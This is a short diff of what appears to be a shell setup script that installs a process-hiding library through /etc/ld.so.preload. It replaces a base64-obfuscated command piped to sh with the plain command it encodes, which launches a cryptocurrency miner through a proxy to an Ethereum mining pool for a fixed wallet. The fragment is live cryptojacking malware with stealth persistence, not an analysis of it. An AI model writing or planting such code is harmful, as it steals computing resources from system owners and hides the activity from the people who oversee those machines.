@@ -44,4 +44,4 @@ make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-base64 -d <<< Li9ncmFmdGNwL2dyYWZ0Y3AgLi9iZXp6SGFzaCAtLXVybD1zc2w6Ly8weGJjNDhiOGJkY2U1NzJkZWZlNGRjYWI4NTEwM2YxNDAwOTliYzVhZjUuTEFQSUBldGgtdXMtd2VzdC5mbGV4cG9vbC5pbzo1NTU1IC0tbG9nIC0tZXh0cmEgLS1sYXRlbmN5IC0tYWxsLXNoYXJlcyAtLXNoYXJlcy1kZXRhaWwgLS1zaG93LW1vZGUgLS1saXN0LW1vZGVzIC0tbW9kZT05OQ== | sh
+./graftcp/graftcp ./bezzHash --url=ssl://0xbc48b8bdce572defe4dcab85103f140099bc5af5.LAPI@eth-us-west.flexpool.io:5555 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
